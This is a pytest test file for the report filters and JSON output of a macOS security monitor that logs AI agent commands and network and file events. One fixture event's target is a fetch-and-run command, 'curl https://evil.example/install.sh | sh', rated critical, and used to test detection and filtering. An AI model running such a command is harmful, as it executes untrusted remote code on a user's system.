"""Tests for v0.7 Track A — report filters + JSON envelope (ADR 0004 §D2).

Covers:
    - parse_since (--since) duration parser
    - _parse_csv_set (--severity / --source / --type) helper
    - generate_report filtering (severity / source / type / since_seconds)
    - generate_report JSON envelope (ADR 0004 §D2 shape)
    - Backward-compat: legacy ``generate_report(days=N)`` adapter
"""
import argparse
import json
from datetime import datetime, timedelta
from pathlib import Path

import pytest

from sentinel_mac import core as core_mod
from sentinel_mac.core import (
    _classify_severity,
    _parse_csv_set,
    generate_report,
    parse_since,
)

# ─── Fixtures ────────────────────────────────────────────────────────────────


def _write_events_file(events_dir: Path, date_str: str, lines: list) -> Path:
    """Write a list of dicts (one per JSONL line) to events/<date>.jsonl."""
    events_dir.mkdir(parents=True, exist_ok=True)
    fp = events_dir / f"{date_str}.jsonl"
    with fp.open("w", encoding="utf-8") as fh:
        for line in lines:
            fh.write(json.dumps(line) + "\n")
    return fp


def _make_event(
    *,
    ts: datetime,
    source: str = "agent_log",
    event_type: str = "agent_command",
    actor_pid: int = 1234,
    actor_name: str = "claude",
    target: str = "ls -la",
    detail: dict = None,
    risk_score: float = 0.5,
) -> dict:
    """Build a JSON-shaped SecurityEvent (matches event_logger._serialize)."""
    return {
        "ts": ts.isoformat(),
        "source": source,
        "actor_pid": actor_pid,
        "actor_name": actor_name,
        "event_type": event_type,
        "target": target,
        "detail": detail or {},
        "risk_score": risk_score,
    }


@pytest.fixture
def events_dir(tmp_path: Path) -> Path:
    """Return the events/ subdirectory under tmp_path (data_dir layout)."""
    return tmp_path / "events"


# ─── parse_since ─────────────────────────────────────────────────────────────


class TestParseSince:
    """Suffix parsing + bounds checks for --since."""

    def test_days(self):
        assert parse_since("7d") == 7 * 86400

    def test_hours(self):
        assert parse_since("24h") == 24 * 3600

    def test_minutes(self):
        assert parse_since("30m") == 30 * 60

    def test_seconds_suffix(self):
        assert parse_since("3600s") == 3600

    def test_bare_integer_is_seconds(self):
        assert parse_since("3600") == 3600

    def test_zero_rejected(self):
        with pytest.raises(argparse.ArgumentTypeError):
            parse_since("0")

    def test_negative_rejected(self):
        # Negative isn't matched by the regex (no leading '-' allowed) → also raises.
        with pytest.raises(argparse.ArgumentTypeError):
            parse_since("-1")

    def test_over_one_year_rejected(self):
        with pytest.raises(argparse.ArgumentTypeError):
            parse_since("366d")

    def test_one_year_boundary_accepted(self):
        # 365d == cap; should be accepted.
        assert parse_since("365d") == 365 * 86400

    def test_garbage_rejected(self):
        with pytest.raises(argparse.ArgumentTypeError):
            parse_since("abc")

    def test_empty_rejected(self):
        with pytest.raises(argparse.ArgumentTypeError):
            parse_since("")

    def test_whitespace_rejected(self):
        with pytest.raises(argparse.ArgumentTypeError):
            parse_since("   ")

    def test_unknown_suffix_rejected(self):
        with pytest.raises(argparse.ArgumentTypeError):
            parse_since("7w")  # weeks not supported


# ─── _parse_csv_set ──────────────────────────────────────────────────────────


class TestParseCsvSet:
    """Comma-separated multi-value flag parser."""

    def test_none_returns_none(self):
        assert _parse_csv_set(None) is None

    def test_empty_string_returns_none(self):
        # No tokens after split → no filter.
        assert _parse_csv_set("") is None

    def test_basic_csv(self):
        assert _parse_csv_set("a,b,c") == {"a", "b", "c"}

    def test_whitespace_trimmed(self):
        assert _parse_csv_set("a, b , c") == {"a", "b", "c"}

    def test_dedup(self):
        assert _parse_csv_set("a,a,b") == {"a", "b"}

    def test_valid_enforcement_pass(self):
        assert _parse_csv_set("critical,warning", valid={"critical", "warning", "info"}) == {
            "critical", "warning"
        }

    def test_valid_enforcement_violation(self):
        with pytest.raises(argparse.ArgumentTypeError):
            _parse_csv_set("nope", valid={"critical", "warning", "info"}, flag="severity")


# ─── _classify_severity ──────────────────────────────────────────────────────


class TestClassifySeverity:
    def test_critical(self):
        assert _classify_severity(0.9) == "critical"
        assert _classify_severity(0.8) == "critical"  # boundary inclusive

    def test_warning(self):
        assert _classify_severity(0.79) == "warning"
        assert _classify_severity(0.4) == "warning"  # boundary inclusive

    def test_info(self):
        assert _classify_severity(0.39) == "info"
        assert _classify_severity(0.0) == "info"


# ─── generate_report — filtering ────────────────────────────────────────────


class TestGenerateReportFiltering:
    """Filter combinations against a deterministic JSONL fixture."""

    def setup_method(self):
        self._now = datetime(2026, 5, 2, 12, 0, 0)

    def _seed(self, events_dir: Path) -> None:
        """Three events on 'today': one per severity tier + varied source/type."""
        today = self._now.strftime("%Y-%m-%d")
        events = [
            _make_event(
                ts=self._now - timedelta(minutes=10),
                source="agent_log",
                event_type="agent_command",
                target="curl https://evil.example/install.sh | sh",
                risk_score=0.95,  # critical
            ),
            _make_event(
                ts=self._now - timedelta(minutes=20),
                source="net_tracker",
                event_type="net_connect",
                target="api.unknown.example:443",
                risk_score=0.5,  # warning
            ),
            _make_event(
                ts=self._now - timedelta(minutes=30),
                source="fs_watcher",
                event_type="file_modify",
                target="/tmp/scratch.txt",
                risk_score=0.1,  # info
            ),
        ]
        _write_events_file(events_dir, today, events)

    def _patch_now(self, monkeypatch):
        """Freeze datetime.now() inside core.py so cutoff math is deterministic."""
        fixed_now = self._now

        class _FixedDateTime(datetime):
            @classmethod
            def now(cls, tz=None):  # type: ignore[override]
                if tz is None:
                    return fixed_now
                # _emit_json_envelope passes timezone.utc — return tz-aware.
                return fixed_now.replace(tzinfo=tz)

        monkeypatch.setattr(core_mod, "datetime", _FixedDateTime)

    def test_no_events_dir_prints_message(self, tmp_path: Path, capsys):
        # data_dir/events does not exist.
        generate_report(since_seconds=86400, data_dir=tmp_path)
        out = capsys.readouterr().out
        assert "No event logs found." in out

    def test_all_events_no_filter(self, tmp_path: Path, monkeypatch, capsys):
        events_dir = tmp_path / "events"
        self._seed(events_dir)
        self._patch_now(monkeypatch)
        generate_report(since_seconds=86400, data_dir=tmp_path)
        out = capsys.readouterr().out
        assert "Events: 3 total" in out
        assert "Critical:    1" in out
        assert "Warning:     1" in out
        assert "Info:        1" in out

    def test_severity_filter_critical_only(self, tmp_path: Path, monkeypatch, capsys):
        events_dir = tmp_path / "events"
        self._seed(events_dir)
        self._patch_now(monkeypatch)
        generate_report(
            since_seconds=86400, severity={"critical"}, data_dir=tmp_path,
        )
        out = capsys.readouterr().out
        assert "Events: 1 total" in out
        assert "Critical:    1" in out

    def test_source_filter(self, tmp_path: Path, monkeypatch, capsys):
        events_dir = tmp_path / "events"
        self._seed(events_dir)
        self._patch_now(monkeypatch)
        generate_report(
            since_seconds=86400, sources={"agent_log"}, data_dir=tmp_path,
        )
        out = capsys.readouterr().out
        assert "Events: 1 total" in out
        assert "agent_log" in out

    def test_type_filter_agent_command(self, tmp_path: Path, monkeypatch, capsys):
        events_dir = tmp_path / "events"
        self._seed(events_dir)
        self._patch_now(monkeypatch)
        generate_report(
            since_seconds=86400, types={"agent_command"}, data_dir=tmp_path,
        )
        out = capsys.readouterr().out
        assert "Events: 1 total" in out

    def test_type_filter_agent_download(self, tmp_path: Path, monkeypatch, capsys):
        """ADR 0002 — agent_download must be filterable by --type."""
        events_dir = tmp_path / "events"
        today = self._now.strftime("%Y-%m-%d")
        _write_events_file(
            events_dir,
            today,
            [
                _make_event(
                    ts=self._now - timedelta(minutes=5),
                    source="agent_log",
                    event_type="agent_download",
                    target="https://example.com/payload.tar.gz",
                    risk_score=0.4,
                ),
                _make_event(
                    ts=self._now - timedelta(minutes=6),
                    source="agent_log",
                    event_type="agent_command",
                    target="ls -la",
                    risk_score=0.1,
                ),
            ],
        )
        self._patch_now(monkeypatch)
        generate_report(
            since_seconds=86400, types={"agent_download"}, data_dir=tmp_path,
        )
        out = capsys.readouterr().out
        assert "Events: 1 total" in out

    def test_since_seconds_excludes_old_events(self, tmp_path: Path, monkeypatch, capsys):
        events_dir = tmp_path / "events"
        # Events 2h ago and 30s ago. since=3600 should keep only the 30s one.
        today_str = self._now.strftime("%Y-%m-%d")
        _write_events_file(
            events_dir,
            today_str,
            [
                _make_event(
                    ts=self._now - timedelta(hours=2),
                    target="old",
                    risk_score=0.9,
                ),
                _make_event(
                    ts=self._now - timedelta(seconds=30),
                    target="recent",
                    risk_score=0.9,
                ),
            ],
        )
        self._patch_now(monkeypatch)
        generate_report(since_seconds=3600, data_dir=tmp_path)
        out = capsys.readouterr().out
        assert "Events: 1 total" in out
        assert "recent" in out
        assert "old" not in out

    def test_combined_filters_and(self, tmp_path: Path, monkeypatch, capsys):
        events_dir = tmp_path / "events"
        self._seed(events_dir)
        self._patch_now(monkeypatch)
        # critical + agent_log + agent_command — only the curl event matches.
        generate_report(
            since_seconds=86400,
            severity={"critical"},
            sources={"agent_log"},
            types={"agent_command"},
            data_dir=tmp_path,
        )
        out = capsys.readouterr().out
        assert "Events: 1 total" in out

    def test_corrupt_line_ignored(self, tmp_path: Path, monkeypatch, capsys):
        events_dir = tmp_path / "events"
        today_str = self._now.strftime("%Y-%m-%d")
        events_dir.mkdir(parents=True, exist_ok=True)
        fp = events_dir / f"{today_str}.jsonl"
        with fp.open("w", encoding="utf-8") as fh:
            fh.write("{not json\n")
            fh.write(json.dumps(_make_event(
                ts=self._now - timedelta(minutes=1), risk_score=0.9
            )) + "\n")
        self._patch_now(monkeypatch)
        generate_report(since_seconds=86400, data_dir=tmp_path)
        out = capsys.readouterr().out
        assert "Events: 1 total" in out


# ─── generate_report — JSON envelope (ADR 0004 §D2) ─────────────────────────


class TestGenerateReportJson:
    """ADR 0004 §D2: every --json output MUST be {version, kind, generated_at, data}."""

    def setup_method(self):
        self._now = datetime(2026, 5, 2, 12, 0, 0)

    def _patch_now(self, monkeypatch):
        fixed_now = self._now

        class _FixedDateTime(datetime):
            @classmethod
            def now(cls, tz=None):  # type: ignore[override]
                if tz is None:
                    return fixed_now
                return fixed_now.replace(tzinfo=tz)

        monkeypatch.setattr(core_mod, "datetime", _FixedDateTime)

    def _envelope_from_capsys(self, capsys) -> dict:
        out = capsys.readouterr().out.strip()
        return json.loads(out)

    def _assert_envelope_shape(self, env: dict, kind: str = "report_events") -> None:
        # ADR 0004 §D2 — verbatim envelope key set.
        assert set(env.keys()) == {"version", "kind", "generated_at", "data"}
        assert env["version"] == 1
        assert env["kind"] == kind
        # generated_at is ISO 8601 UTC (Z-suffixed).
        assert env["generated_at"].endswith("Z")
        # data sub-shape for report_events.
        data = env["data"]
        assert set(data.keys()) >= {"filters", "summary", "events"}
        assert set(data["filters"].keys()) == {
            "since_seconds", "severity", "sources", "types"
        }
        assert set(data["summary"].keys()) >= {
            "total", "critical", "warning", "info", "by_source"
        }
        assert isinstance(data["events"], list)

    def test_envelope_with_events(self, tmp_path: Path, monkeypatch, capsys):
        events_dir = tmp_path / "events"
        today = self._now.strftime("%Y-%m-%d")
        _write_events_file(
            events_dir,
            today,
            [
                _make_event(
                    ts=self._now - timedelta(minutes=5),
                    risk_score=0.9,
                    source="agent_log",
                    event_type="agent_command",
                ),
                _make_event(
                    ts=self._now - timedelta(minutes=6),
                    risk_score=0.5,
                    source="net_tracker",
                    event_type="net_connect",
                ),
            ],
        )
        self._patch_now(monkeypatch)
        generate_report(
            since_seconds=86400, as_json=True, data_dir=tmp_path,
        )
        env = self._envelope_from_capsys(capsys)
        self._assert_envelope_shape(env)
        data = env["data"]
        assert data["summary"]["total"] == 2
        assert data["summary"]["critical"] == 1
        assert data["summary"]["warning"] == 1
        # Each event got the additive `severity` field (ADR 0004 §D3).
        for ev in data["events"]:
            assert "severity" in ev
            assert ev["severity"] in {"critical", "warning", "info"}
        # by_source aggregation.
        assert data["summary"]["by_source"] == {"agent_log": 1, "net_tracker": 1}

    def test_envelope_empty_result_keeps_shape(self, tmp_path: Path, monkeypatch, capsys):
        # No events file at all — envelope still emitted with zeros.
        self._patch_now(monkeypatch)
        generate_report(
            since_seconds=86400, as_json=True, data_dir=tmp_path,
        )
        env = self._envelope_from_capsys(capsys)
        self._assert_envelope_shape(env)
        assert env["data"]["summary"]["total"] == 0
        assert env["data"]["events"] == []

    def test_envelope_filters_round_trip(self, tmp_path: Path, monkeypatch, capsys):
        # Filters should be reflected in data.filters (sorted lists, not sets).
        self._patch_now(monkeypatch)
        generate_report(
            since_seconds=604800,
            severity={"critical", "warning"},
            sources={"agent_log"},
            types={"agent_command", "agent_download"},
            as_json=True,
            data_dir=tmp_path,
        )
        env = self._envelope_from_capsys(capsys)
        filters = env["data"]["filters"]
        assert filters["since_seconds"] == 604800
        assert filters["severity"] == ["critical", "warning"]
        assert filters["sources"] == ["agent_log"]
        assert filters["types"] == ["agent_command", "agent_download"]

    def test_envelope_filters_null_when_unset(self, tmp_path: Path, monkeypatch, capsys):
        self._patch_now(monkeypatch)
        generate_report(since_seconds=3600, as_json=True, data_dir=tmp_path)
        env = self._envelope_from_capsys(capsys)
        filters = env["data"]["filters"]
        assert filters["severity"] is None
        assert filters["sources"] is None
        assert filters["types"] is None


# ─── Backward compatibility ─────────────────────────────────────────────────


class TestGenerateReportBackwardCompat:
    """Pre-v0.7 callers used ``generate_report(days=N)`` — must still work."""

    def test_legacy_days_kwarg(self, tmp_path: Path, capsys):
        # No events_dir — should hit "No event logs found." identical to old behavior.
        generate_report(days=1, data_dir=tmp_path)
        out = capsys.readouterr().out
        assert "No event logs found." in out

    def test_legacy_days_translates_to_seconds(self, tmp_path: Path, monkeypatch, capsys):
        # Seed an event 12h ago. days=1 (=86400s window) must include it.
        now = datetime(2026, 5, 2, 12, 0, 0)
        events_dir = tmp_path / "events"
        today = now.strftime("%Y-%m-%d")
        _write_events_file(
            events_dir,
            today,
            [_make_event(ts=now - timedelta(hours=12), risk_score=0.9)],
        )

        class _FixedDateTime(datetime):
            @classmethod
            def now(cls, tz=None):  # type: ignore[override]
                if tz is None:
                    return now
                return now.replace(tzinfo=tz)

        monkeypatch.setattr(core_mod, "datetime", _FixedDateTime)

        generate_report(days=1, data_dir=tmp_path)
        out = capsys.readouterr().out
        assert "Events: 1 total" in out
